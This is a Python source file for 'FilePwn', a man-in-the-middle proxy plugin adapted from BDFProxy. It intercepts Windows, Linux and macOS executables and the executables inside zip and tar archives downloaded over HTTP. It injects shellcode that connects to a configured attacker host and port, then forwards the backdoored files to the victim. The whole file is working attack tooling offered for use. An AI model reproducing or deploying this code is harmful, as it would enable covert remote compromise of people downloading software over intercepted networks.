################################################################################################
# 99.9999999% of this code is stolen from BDFProxy - https://github.com/secretsquirrel/BDFProxy
#################################################################################################

"""
    BackdoorFactory Proxy (BDFProxy) v0.2 - 'Something Something'

    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com

    Copyright (c) 2013-2014, Joshua Pitts
    All rights reserved.

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

        1. Redistributions of source code must retain the above copyright notice,
        this list of conditions and the following disclaimer.

        2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

        3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software without
        specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.

    Tested on Kali-Linux.

"""

import sys
import os
import pefile
import zipfile
import logging
import shutil
import random
import string
import tarfile
from libs.bdfactory import pebin
from libs.bdfactory import elfbin
from libs.bdfactory import machobin
from plugins.plugin import Plugin
from tempfile import mkstemp
from configobj import ConfigObj

class FilePwn(Plugin):
    name = "FilePwn"
    optname = "filepwn"
    implements = ["handleResponse"]
    has_opts = False
    desc = "Backdoor executables being sent over http using bdfactory"

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options

        #FOR FUTURE USE
        self.binaryMimeTypes = ["application/octet-stream", 'application/x-msdownload', 'application/x-msdos-program', 'binary/octet-stream']
        
        #FOR FUTURE USE
        self.zipMimeTypes = ['application/x-zip-compressed', 'application/zip']

        #USED NOW
        self.magicNumbers = {'elf': {'number': '7f454c46'.decode('hex'), 'offset': 0},
                             'pe': {'number': 'MZ', 'offset': 0},
                             'gz': {'number': '1f8b'.decode('hex'), 'offset': 0},
                             'bz': {'number': 'BZ', 'offset': 0},
                             'zip': {'number': '504b0304'.decode('hex'), 'offset': 0},
                             'tar': {'number': 'ustar', 'offset': 257},
                             'fatfile': {'number': 'cafebabe'.decode('hex'), 'offset': 0},
                             'machox64': {'number': 'cffaedfe'.decode('hex'), 'offset': 0},
                             'machox86': {'number': 'cefaedfe'.decode('hex'), 'offset': 0},
                             }

        #NOT USED NOW
        #self.supportedBins = ('MZ', '7f454c46'.decode('hex'))

        self.userConfig      = options.configfile['FilePwn']
        self.FileSizeMax     = self.userConfig['targets']['ALL']['FileSizeMax']
        self.WindowsIntelx86 = self.userConfig['targets']['ALL']['WindowsIntelx86']
        self.WindowsIntelx64 = self.userConfig['targets']['ALL']['WindowsIntelx64']
        self.WindowsType     = self.userConfig['targets']['ALL']['WindowsType']
        self.LinuxIntelx86   = self.userConfig['targets']['ALL']['LinuxIntelx86']
        self.LinuxIntelx64   = self.userConfig['targets']['ALL']['LinuxIntelx64']
        self.LinuxType       = self.userConfig['targets']['ALL']['LinuxType']
        self.MachoIntelx86   = self.userConfig['targets']['ALL']['MachoIntelx86']
        self.MachoIntelx64   = self.userConfig['targets']['ALL']['MachoIntelx64']
        self.FatPriority     = self.userConfig['targets']['ALL']['FatPriority']
        self.zipblacklist    = self.userConfig['ZIP']['blacklist']
        self.tarblacklist    = self.userConfig['TAR']['blacklist']

        print "[*] FilePwn plugin online"

    def convert_to_Bool(self, aString):
        if aString.lower() == 'true':
            return True
        elif aString.lower() == 'false':
            return False
        elif aString.lower() == 'none':
            return None

    def bytes_have_format(self, bytess, formatt):
        number = self.magicNumbers[formatt]
        if bytess[number['offset']:number['offset'] + len(number['number'])] == number['number']:
            return True
        return False

    def binaryGrinder(self, binaryFile):
        """
        Feed potential binaries into this function,
        it will return the result PatchedBinary, False, or None
        """

        with open(binaryFile, 'r+b') as f:
            binaryTMPHandle = f.read()

        binaryHeader = binaryTMPHandle[:4]
        result = None

        try:
            if binaryHeader[:2] == 'MZ':  # PE/COFF
                pe = pefile.PE(data=binaryTMPHandle, fast_load=True)
                magic = pe.OPTIONAL_HEADER.Magic
                machineType = pe.FILE_HEADER.Machine

                #update when supporting more than one arch
                if (magic == int('20B', 16) and machineType == 0x8664 and
                   self.WindowsType.lower() in ['all', 'x64']):
                        add_section = False
                        cave_jumping = False
                        if self.WindowsIntelx64['PATCH_TYPE'].lower() == 'append':
                            add_section = True
                        elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
                            cave_jumping = True

                        targetFile = pebin.pebin(FILE=binaryFile,
                                                 OUTPUT=os.path.basename(binaryFile),
                                                 SHELL=self.WindowsIntelx64['SHELL'],
                                                 HOST=self.WindowsIntelx64['HOST'],
                                                 PORT=int(self.WindowsIntelx64['PORT']),
                                                 ADD_SECTION=add_section,
                                                 CAVE_JUMPING=cave_jumping,
                                                 IMAGE_TYPE=self.WindowsType,
                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx64['PATCH_DLL']),
                                                 SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx64['ZERO_CERT']),
                                                 )

                        result = targetFile.run_this()

                elif (machineType == 0x14c and
                      self.WindowsType.lower() in ['all', 'x86']):
                        add_section = False
                        cave_jumping = False
                        #add_section wins for cave_jumping
                        #default is single for BDF
                        if self.WindowsIntelx86['PATCH_TYPE'].lower() == 'append':
                            add_section = True
                        elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
                            cave_jumping = True

                        targetFile = pebin.pebin(FILE=binaryFile,
                                                 OUTPUT=os.path.basename(binaryFile),
                                                 SHELL=self.WindowsIntelx86['SHELL'],
                                                 HOST=self.WindowsIntelx86['HOST'],
                                                 PORT=int(self.WindowsIntelx86['PORT']),
                                                 ADD_SECTION=add_section,
                                                 CAVE_JUMPING=cave_jumping,
                                                 IMAGE_TYPE=self.WindowsType,
                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx86['PATCH_DLL']),
                                                 SUPPLIED_SHELLCODE=self.WindowsIntelx86['SUPPLIED_SHELLCODE'],
                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx86['ZERO_CERT'])
                                                 )

                        result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') == '7f454c46':  # ELF

                targetFile = elfbin.elfbin(FILE=binaryFile, SUPPORT_CHECK=False)
                targetFile.support_check()

                if targetFile.class_type == 0x1:
                    #x86CPU Type
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx86['SHELL'],
                                               HOST=self.LinuxIntelx86['HOST'],
                                               PORT=int(self.LinuxIntelx86['PORT']),
                                               SUPPLIED_SHELLCODE=self.LinuxIntelx86['SUPPLIED_SHELLCODE'],
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()
                elif targetFile.class_type == 0x2:
                    #x64
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx64['SHELL'],
                                               HOST=self.LinuxIntelx64['HOST'],
                                               PORT=int(self.LinuxIntelx64['PORT']),
                                               SUPPLIED_SHELLCODE=self.LinuxIntelx64['SUPPLIED_SHELLCODE'],
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') in  ['cefaedfe', 'cffaedfe', 'cafebabe']: # Macho
                targetFile = machobin.machobin(FILE=binaryFile, SUPPORT_CHECK=False)
                targetFile.support_check()

                #ONE CHIP SET MUST HAVE PRIORITY in FAT FILE

                if targetFile.FAT_FILE is True:
                    if self.FatPriority == 'x86':
                        targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT = os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx86['SHELL'],
                                                   HOST=self.MachoIntelx86['HOST'],
                                                   PORT=int(self.MachoIntelx86['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority
                                                   )
                        result = targetFile.run_this()

                    elif self.FatPriority == 'x64':
                        targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT = os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx64['SHELL'],
                                                   HOST=self.MachoIntelx64['HOST'],
                                                   PORT=int(self.MachoIntelx64['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority
                                                   )
                        result = targetFile.run_this()
          
                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x7': 
                    targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT = os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx86['SHELL'],
                                                   HOST=self.MachoIntelx86['HOST'],
                                                   PORT=int(self.MachoIntelx86['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority
                                                   )
                    result = targetFile.run_this()

                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x1000007': 
                    targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT = os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx64['SHELL'],
                                                   HOST=self.MachoIntelx64['HOST'],
                                                   PORT=int(self.MachoIntelx64['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority
                                                   )
                    result = targetFile.run_this()
          
            return result

        except Exception as e:
            print 'Exception', str(e)
            logging.warning("EXCEPTION IN binaryGrinder %s", str(e))
            return None

    def tar_files(self, aTarFileBytes, formatt):
        "When called will unpack and edit a Tar File and return a tar file"

        print "[*] TarFile size:", len(aTarFileBytes) / 1024, 'KB'

        if len(aTarFileBytes) > int(self.userConfig['TAR']['maxSize']):
            print "[!] TarFile over allowed size"
            logging.info("TarFIle maxSize met %s", len(aTarFileBytes))
            return aTarFileBytes

        with tempfile.NamedTemporaryFile() as tarFileStorage:
            tarFileStorage.write(aTarFileBytes)
            tarFileStorage.flush()

            if not tarfile.is_tarfile(tarFileStorage.name):
                print '[!] Not a tar file'
                return aTarFileBytes

            compressionMode = ':'
            if formatt == 'gz':
                compressionMode = ':gz'
            if formatt == 'bz':
                compressionMode = ':bz2'

            tarFile = None
            try:
                tarFileStorage.seek(0)
                tarFile = tarfile.open(fileobj=tarFileStorage, mode='r' + compressionMode)
            except tarfile.ReadError:
                pass

            if tarFile is None:
                print '[!] Not a tar file'
                return aTarFileBytes

            print '[*] Tar file contents and info:'
            print '[*] Compression:', formatt

            members = tarFile.getmembers()
            for info in members:
                print "\t", info.name, info.mtime, info.size

            newTarFileStorage = tempfile.NamedTemporaryFile()
            newTarFile = tarfile.open(mode='w' + compressionMode, fileobj=newTarFileStorage)

            patchCount = 0
            wasPatched = False

            for info in members:
                print "[*] >>> Next file in tarfile:", info.name

                if not info.isfile():
                    print info.name, 'is not a file'
                    newTarFile.addfile(info, tarFile.extractfile(info))
                    continue

                if info.size >= long(self.FileSizeMax):
                    print info.name, 'is too big'
                    newTarFile.addfile(info, tarFile.extractfile(info))
                    continue

                # Check against keywords
                keywordCheck = False

                if type(self.tarblacklist) is str:
                    if self.tarblacklist.lower() in info.name.lower():
                        keywordCheck = True

                else:
                    for keyword in self.tarblacklist:
                        if keyword.lower() in info.name.lower():
                            keywordCheck = True
                            continue

                if keywordCheck is True:
                    print "[!] Tar blacklist enforced!"
                    logging.info('Tar blacklist enforced on %s', info.name)
                    continue

                # Try to patch
                extractedFile = tarFile.extractfile(info)

                if patchCount >= int(self.userConfig['TAR']['patchCount']):
                    newTarFile.addfile(info, extractedFile)
                else:
                    # create the file on disk temporarily for fileGrinder to run on it
                    with tempfile.NamedTemporaryFile() as tmp:
                        shutil.copyfileobj(extractedFile, tmp)
                        tmp.flush()
                        patchResult = self.binaryGrinder(tmp.name)
                        if patchResult:
                            patchCount += 1
                            file2 = "backdoored/" + os.path.basename(tmp.name)
                            print "[*] Patching complete, adding to tar file."
                            info.size = os.stat(file2).st_size
                            with open(file2, 'rb') as f:
                                newTarFile.addfile(info, f)
                            logging.info("%s in tar patched, adding to tarfile", info.name)
                            os.remove(file2)
                            wasPatched = True
                        else:
                            print "[!] Patching failed"
                            with open(tmp.name, 'rb') as f:
                                newTarFile.addfile(info, f)
                            logging.info("%s patching failed. Keeping original file in tar.", info.name)
                if patchCount == int(self.userConfig['TAR']['patchCount']):
                    logging.info("Met Tar config patchCount limit.")

            # finalize the writing of the tar file first
            newTarFile.close()

            # then read the new tar file into memory
            newTarFileStorage.seek(0)
            ret = newTarFileStorage.read()
            newTarFileStorage.close()  # it's automatically deleted

            if wasPatched is False:
                # If nothing was changed return the original
                print "[*] No files were patched forwarding original file"
                return aTarFileBytes
            else:
                return ret

    def zip_files(self, aZipFile):
        "When called will unpack and edit a Zip File and return a zip file"

        print "[*] ZipFile size:", len(aZipFile) / 1024, 'KB'

        if len(aZipFile) > int(self.userConfig['ZIP']['maxSize']):
            print "[!] ZipFile over allowed size"
            logging.info("ZipFIle maxSize met %s", len(aZipFile))
            return aZipFile

        tmpRan = ''.join(random.choice(string.ascii_lowercase + string.digits + string.ascii_uppercase) for _ in range(8))
        tmpDir = '/tmp/' + tmpRan
        tmpFile = '/tmp/' + tmpRan + '.zip'

        os.mkdir(tmpDir)

        with open(tmpFile, 'w') as f:
            f.write(aZipFile)

        zippyfile = zipfile.ZipFile(tmpFile, 'r')

        #encryption test
        try:
            zippyfile.testzip()

        except RuntimeError as e:
            if 'encrypted' in str(e):
                logging.info('Encrypted zipfile found. Not patching.')
                return aZipFile

        print "[*] ZipFile contents and info:"

        for info in zippyfile.infolist():
            print "\t", info.filename, info.date_time, info.file_size

        zippyfile.extractall(tmpDir)

        patchCount = 0

        wasPatched = False
            
        for info in zippyfile.infolist():
            print "[*] >>> Next file in zipfile:", info.filename

            if os.path.isdir(tmpDir + '/' + info.filename) is True:
                print info.filename, 'is a directory'
                continue

            #Check against keywords
            keywordCheck = False

            if type(self.zipblacklist) is str:
                if self.zipblacklist.lower() in info.filename.lower():
                    keywordCheck = True

            else:
                for keyword in self.zipblacklist:
                    if keyword.lower() in info.filename.lower():
                        keywordCheck = True
                        continue

            if keywordCheck is True:
                print "[!] Zip blacklist enforced!"
                logging.info('Zip blacklist enforced on %s', info.filename)
                continue

            patchResult = self.binaryGrinder(tmpDir + '/' + info.filename)

            if patchResult:
                patchCount += 1
                file2 = "backdoored/" + os.path.basename(info.filename)
                print "[*] Patching complete, adding to zip file."
                shutil.copyfile(file2, tmpDir + '/' + info.filename)
                logging.info("%s in zip patched, adding to zipfile", info.filename)
                os.remove(file2)
                wasPatched = True
            else:
                print "[!] Patching failed"
                logging.info("%s patching failed. Keeping original file in zip.", info.filename)

            print '-' * 10

            if patchCount >= int(self.userConfig['ZIP']['patchCount']):  # Make this a setting.
                logging.info("Met Zip config patchCount limit.")
                break

        zippyfile.close()

        zipResult = zipfile.ZipFile(tmpFile, 'w', zipfile.ZIP_DEFLATED)

        print "[*] Writing to zipfile:", tmpFile

        for base, dirs, files in os.walk(tmpDir):
            for afile in files:
                    filename = os.path.join(base, afile)
                    print '[*] Writing filename to zipfile:', filename.replace(tmpDir + '/', '')
                    zipResult.write(filename, arcname=filename.replace(tmpDir + '/', ''))

        zipResult.close()
        #clean up
        shutil.rmtree(tmpDir)

        with open(tmpFile, 'rb') as f:
            tempZipFile = f.read()
        os.remove(tmpFile)

        if wasPatched is False:
            print "[*] No files were patched forwarding original file"
            return aZipFile
        else:
            return tempZipFile

    def handleResponse(self, request, data):

        content_header = request.client.headers['Content-Type']
        client_ip = request.client.getClientIP()

        if content_header in self.zipMimeTypes:
            
            if self.bytes_have_format(data, 'zip'):
                logging.info("%s Detected supported zip file type!" % client_ip)
                bd_zip = self.zip_files(data)
                if bd_zip:
                    logging.info("%s Patching complete, forwarding to client" % client_ip)
                    return {'request': request, 'data': bd_zip}

            else:
                for tartype in ['gz','bz','tar']:
                    if self.bytes_have_format(data, tartype):
                        logging.info("%s Detected supported tar file type!" % client_ip)
                        bd_tar = self.tar_files(data)
                        if bd_tar:
                            logging.info("%s Patching complete, forwarding to client" % client_ip)
                            return {'request': request, 'data': bd_tar}

        
        elif content_header in self.binaryMimeTypes:
            for bintype in ['pe','elf','fatfile','machox64','machox86']:
                if self.bytes_have_format(data, bintype):
                    logging.info("%s Detected supported binary type!" % client_ip)
                    fd, tmpFile = mkstemp()
                    with open(tmpFile, 'w') as f:
                        f.write(data)
            
                    patchb = self.binaryGrinder(tmpFile)
                    
                    if patchb:
                        bd_binary = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
                        os.remove('./backdoored/' + os.path.basename(tmpFile))
                        logging.info("%s Patching complete, forwarding to client" % client_ip)
                        return {'request': request, 'data': bd_binary}

        else:
            logging.debug("%s File is not of supported Content-Type: %s" % (client_ip, content_header))
            return {'request': request, 'data': data}